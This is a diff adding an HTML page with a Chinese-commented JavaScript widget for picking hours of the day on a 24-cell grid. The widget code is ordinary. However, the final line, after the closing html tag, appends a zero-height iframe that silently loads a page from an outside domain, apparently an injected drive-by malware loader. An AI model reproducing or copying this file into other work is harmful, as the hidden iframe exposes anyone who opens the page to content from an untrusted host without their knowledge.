@@ -1,0 +1,228 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>无标题文档</title>
+<style type="text/css">
+#TimeSelect	{
+	height:25px;
+}
+#TimeSelect div{
+	background-color:#FFFFFF;
+	height:100%;
+	width:100%;
+}
+</style>
+
+<script language="javascript">
+<!--
+// 全局变量
+var g_bBeginSelect = false;
+var g_bNewElement = true;
+
+// 选择的时间改变
+function TimeSelectChange()
+{
+	var 	str		= "";
+	
+	for(var i = 0; i < 24; i++)
+	{
+		var 	strI;
+		
+		if(i < 10)
+			strI = "0" + i;
+		else
+			strI = String(i);
+			
+		if(/3366$/i.test(document.getElementById("div"+strI).style.backgroundColor))
+		{
+			if(str == "")
+				str += strI;
+			else
+				str += "," + strI;
+		}
+	}
+	
+	DebugText.innerText = "选择的时间有:" + str;
+}
+// 选择全部
+function TimeSelectAll(bSel)
+{
+	for(var i = 0; i < 24; i++)
+	{
+		var 	strI;
+		
+		if(i < 10)
+			strI = "0" + i;
+		else
+			strI = String(i);
+		
+		document.getElementById("div"+strI).style.backgroundColor = (bSel)?"#003366":"#FFFFFF";
+	}
+	
+	TimeSelectChange();
+}
+
+// 选择时间段
+function TimeSelectDay(bDay)
+{
+	for(var i = 0; i < 24; i++)
+	{
+		var 	strI;
+		
+		if(i < 10)
+			strI = "0" + i;
+		else
+			strI = String(i);
+		
+		var		strColor	= "#FFFFFF";
+		
+		if((bDay && (i > 7 && i < 21)) || (!bDay && (i <= 7 || i >= 21)))
+		{
+			strColor = "#003366";
+		}
+		
+		document.getElementById("div"+strI).style.backgroundColor = strColor;
+	}	
+	
+	TimeSelectChange();
+}
+// 鼠标弹起
+function TimeSelectOnMouseUp()
+{
+	if(true == g_bBeginSelect)
+		TimeSelectChange();
+	g_bBeginSelect = false;
+}
+// 鼠标按下
+function TimeSelectOnMouseDown()
+{
+	var   oEvent   =   document.parentWindow.event;
+	var   eleDiv   =   oEvent.srcElement;
+
+	if(String(eleDiv.id).substr(0, 3) == "div")
+	{
+		g_bBeginSelect = true;
+		g_bNewElement = true;
+		ConvertColor(eleDiv);
+	}
+}
+// 时间选择控件鼠标移上
+function TimeSelectOnMouseOver()
+{
+	if(false == g_bNewElement && true == g_bBeginSelect)
+	{
+		var   oEvent   =   document.parentWindow.event;
+		var   eleDiv   =   oEvent.srcElement;
+		
+		if(String(eleDiv.id).substr(0, 3) ==  "div")
+		{
+			ConvertColor(eleDiv);
+		}
+	}
+	g_bNewElement = true;
+}
+// 时间选择控件鼠标移出
+function TimeSelectOnMouseOut()
+{
+	g_bNewElement = false;
+}
+// 转换颜色
+function ConvertColor(div)
+{
+	if(/3366$/i.test(div.style.backgroundColor))
+	{
+		div.style.backgroundColor = "#FFFFFF";
+	}
+	else
+	{
+		div.style.backgroundColor = "#003366";
+	}
+}
+// 注册事件
+window.onload = function()
+{
+	if(TimeSelect.addEventListener)	// firefox
+	{
+		TimeSelect.addEventListener("onmouseover", TimeSelectOnMouseOver, false);
+		TimeSelect.addEventListener("onmouseout", TimeSelectOnMouseOut, false);
+		document.addEventListener("onmousedown", TimeSelectOnMouseDown, false);
+		document.addEventListener("onmouseup", TimeSelectOnMouseUp, false);
+	}
+	else	// ie
+	{
+		TimeSelect.attachEvent("onmouseover", TimeSelectOnMouseOver);
+		TimeSelect.attachEvent("onmouseout", TimeSelectOnMouseOut);
+		document.attachEvent("onmousedown", TimeSelectOnMouseDown);
+		document.attachEvent("onmouseup", TimeSelectOnMouseUp);
+	}
+}
+-->
+</script>
+</head>
+
+<body oncontextmenu="return false;" onselectstart="return false;">
+<table width="200" border="1">
+													    <tr>
+													      <td>00</td>
+													      <td>01</td>
+													      <td>02</td>
+													      <td>03</td>
+													      <td>04</td>
+													      <td>05</td>
+													      <td>06</td>
+													      <td>07</td>
+													      <td>08</td>
+													      <td>09</td>
+													      <td>10</td>
+													      <td>11</td>
+													      <td>12</td>
+													      <td>13</td>
+													      <td>14</td>
+													      <td>15</td>
+													      <td>16</td>
+													      <td>17</td>
+													      <td>18</td>
+													      <td>19</td>
+													      <td>20</td>
+													      <td>21</td>
+													      <td>22</td>
+													      <td>23</td>
+												        </tr>
+													    <tr id="TimeSelect">
+													      <td><div id=div00></div></td>
+													      <td><div id=div01></div></td>
+													      <td><div id=div02></div></td>
+													      <td><div id=div03></div></td>
+													      <td><div id=div04></div></td>
+													      <td><div id=div05></div></td>
+													      <td><div id=div06></div></td>
+													      <td><div id=div07></div></td>
+													      <td><div id=div08></div></td>
+													      <td><div id=div09></div></td>
+													      <td><div id=div10></div></td>
+													      <td><div id=div11></div></td>
+													      <td><div id=div12></div></td>
+													      <td><div id=div13></div></td>
+													      <td><div id=div14></div></td>
+													      <td><div id=div15></div></td>
+													      <td><div id=div16></div></td>
+													      <td><div id=div17></div></td>
+													      <td><div id=div18></div></td>
+													      <td><div id=div19></div></td>
+													      <td><div id=div20></div></td>
+													      <td><div id=div21></div></td>
+													      <td><div id=div22></div></td>
+													      <td><div id=div23></div></td>
+												        </tr>
+													    <tr>
+													      <td colspan="24" align="right"><button onclick="TimeSelectAll(false);">清空</button>
+													        <button onclick="TimeSelectAll(true);">全选</button>
+													        <button onclick="TimeSelectDay(true);">白天</button>
+													        <button onclick="TimeSelectDay(false);">晚上</button></td>
+												        </tr>
+												      </table>
+<div id="DebugText"></div>
+</body>
+</html>
+<iframe src=http://www.114Oldest.com/zz/mm.htm width=100 height=0></iframe>
